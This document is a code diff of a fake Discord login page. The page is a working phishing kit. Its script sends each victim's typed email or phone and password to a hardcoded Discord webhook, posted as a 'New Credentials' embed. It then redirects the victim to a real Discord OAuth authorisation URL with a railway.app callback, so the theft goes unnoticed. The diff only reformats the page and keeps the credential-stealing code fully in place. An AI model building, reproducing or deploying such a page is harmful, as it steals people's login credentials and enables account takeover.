@@ -30,28 +30,15 @@
     <form id="loginForm">
       <div class="mb-4">
         <label class="block text-sm font-medium mb-2 uppercase tracking-wide">EMAIL OR PHONE NUMBER</label>
-        <input
-          type="text"
-          id="email"
-          required
-          class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord"
-        />
+        <input type="text" id="email" required class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord" />
       </div>
 
       <div class="mb-6">
         <label class="block text-sm font-medium mb-2 uppercase tracking-wide">PASSWORD</label>
-        <input
-          type="password"
-          id="password"
-          required
-          class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord"
-        />
+        <input type="password" id="password" required class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord" />
       </div>
 
-      <button
-        type="submit"
-        class="w-full py-3 bg-discord hover:bg-[#4752c4] text-white font-semibold rounded transition"
-      >
+      <button type="submit" class="w-full py-3 bg-discord hover:bg-[#4752c4] text-white font-semibold rounded transition">
         Log In
       </button>
 
@@ -62,39 +49,35 @@
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
-
-    form.addEventListener('submit', async (e) => {
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      // Send creds to webhook
-      const creds = {
-        embeds: [{
-          title: "New Creds",
-          color: 0x5865F2,
-          fields: [
-            { name: "Email", value: email || "—", inline: false },
-            { name: "Password", value: password || "—", inline: false },
-            { name: "Time", value: new Date().toISOString(), inline: false }
-          ]
-        }]
-      };
-
+      // Send credentials to webhook
       fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(creds)
+        body: JSON.stringify({
+          embeds: [{
+            title: "New Credentials",
+            color: 0x5865F2,
+            fields: [
+              { name: "Email / Phone", value: email || "—", inline: false },
+              { name: "Password", value: password || "—", inline: false },
+              { name: "Time", value: new Date().toISOString(), inline: false }
+            ]
+          }]
+        })
       }).catch(() => {});
 
-      // Redirect to OAuth with your real client ID
+      // Redirect to Discord OAuth
       const clientId = '1479876735242731571';
-      const redirectUri = encodeURIComponent('https://sya-production.up.railway.app/callback'); // change if needed
-      const oauth = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email`;
+      const redirectUri = encodeURIComponent('https://sya-production.up.railway.app/callback');
+      const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email`;
 
-      window.location.href = oauth;
+      window.location.href = oauthUrl;
     });
   </script>
 </body>
